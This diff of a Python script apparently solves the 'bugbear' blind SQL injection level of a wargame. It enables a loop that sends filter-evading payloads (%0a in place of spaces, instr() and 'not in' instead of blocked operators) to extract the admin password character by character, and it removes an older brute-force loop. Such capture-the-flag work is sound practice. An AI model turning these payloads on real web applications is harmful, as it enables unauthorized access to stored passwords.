@@ -25,42 +25,24 @@ pLength = 0
 
 #instr의 중복문제를 생각해야함
 
-# answer = ''
-# for i in range(0,8):
-#     for j in candidate:
-#         #string to hex
-#         hex_j = '0x'+j.encode('utf-8').hex()
-#         url=os.environ.get('LOS_URL')+'chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1234&no=1||!(id%0anot%0ain%0a("admin")||instr(pw,'+j+')not%0ain('+str(i+1)+'))'
-#         #print(url)
-#         headers = {
-#             'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
-#         }
-#         res=requests.get(url, headers=headers)
-#         if 'Hello admin' in res.text[:200]:
-#             answer += j
-#             break
-#         else:
-#             print(j+' is not the answer')
-#     print(answer)
+answer = ''
+for i in range(0,8):
+    for j in candidate:
+        #string to hex
+        hex_j = '0x'+j.encode('utf-8').hex()
+        url=os.environ.get('LOS_URL')+'chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1234&no=1||!(id%0anot%0ain%0a("admin")||instr(pw,"'+j+'")not%0ain('+str(i+1)+'))'
+        #print(url)
+        headers = {
+            'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
+        }
+        res=requests.get(url, headers=headers)
+        if 'Hello admin' in res.text[:200]:
+            answer += j
+            break
+        else:
+            print(j+' is not the answer')
+    print(answer)
 
-# print(answer)
+print(answer)
 
-
-array1 = [5,2]
-array2 = [5,2,3,9]
-
-for i in array1:
-    for j in array1:
-        for k in array2:
-            pw = '52'+str(i)+str(j)+'39'+str(k)+'1'
-            url=os.environ.get('LOS_URL')+'chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1234&no=1||!(id%0anot%0ain%0a("admin")||pw%0anot%0ain("'+pw+'"))'
-            print(url)
-            headers = {
-                'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
-            }
-            res=requests.get(url, headers=headers)
-            if 'Hello admin' in res.text[:200]:
-                print('pw is '+pw)
-                break
-            else:
-                print(pw+' is not the answer')
+#52dc39" "1
